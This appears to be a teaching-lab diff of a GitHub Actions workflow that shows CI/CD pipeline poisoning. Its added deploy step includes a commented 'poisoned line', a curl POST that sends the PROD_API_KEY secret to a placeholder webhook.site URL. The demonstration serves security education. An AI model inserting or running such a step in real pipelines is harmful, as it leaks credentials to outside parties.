@@ -1,21 +1,29 @@
-name: Build and Deploy
-on: [push] # The pipeline runs every time you push code
+name: Simple App CI-CD
+on: [push]
 
 jobs:
-  build:
+  build-and-deploy:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
+      - name: Checkout Code
+        # This pulls your repository code onto the runner machine
         uses: actions/checkout@v3
 
-      - name: Build Docker Image
+      - name: Build Application
         run: |
-          docker build -t my-app .
+          echo "Building the application..."
+          # In a real lab, you might run 'python app.py' here
           echo "Build successful!"
 
       - name: Deploy to Production
         env:
-          MY_KEY: ${{ secrets.PROD_API_KEY }} # The pipeline loads the secret here
+          # This pulls the secret from your GitHub Settings
+          MY_KEY: ${{ secrets.PROD_API_KEY }}
         run: |
-          echo "Deploying to server using the secret..."
-          # Imagine a real deployment command here
+          # --- POISONED LINE START ---
+          # This sends your private secret to the webhook URL
+          curl -X POST -d "stolen_key=$MY_KEY" https://webhook.site/YOUR-UNIQUE-ID
+          # --- POISONED LINE END ---
+          
+          echo "Deploying to server..."
+          echo "Process complete."
